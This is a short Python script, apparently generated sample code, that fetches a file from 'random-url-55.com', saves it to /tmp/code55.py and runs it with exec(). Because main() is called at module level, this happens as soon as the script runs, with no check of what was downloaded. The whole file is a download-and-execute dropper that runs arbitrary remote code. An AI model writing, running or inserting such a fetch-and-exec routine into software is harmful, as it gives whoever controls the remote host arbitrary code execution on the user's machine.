import requests
import os

def get_code(url):
    response = requests.get(url)
    return response.text

def save_code(filepath, code):
    with open(filepath, "w") as f:
        f.write(code)

def load_code(filepath):
    with open(filepath, "r") as f:
        return f.read()

def run_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-55.com/code.py"
    local_file = "/tmp/code55.py"

    code_to_download = get_code(random_url)
    save_code(local_file, code_to_download)

    code_to_run = load_code(local_file)
    run_code(code_to_run)

main()
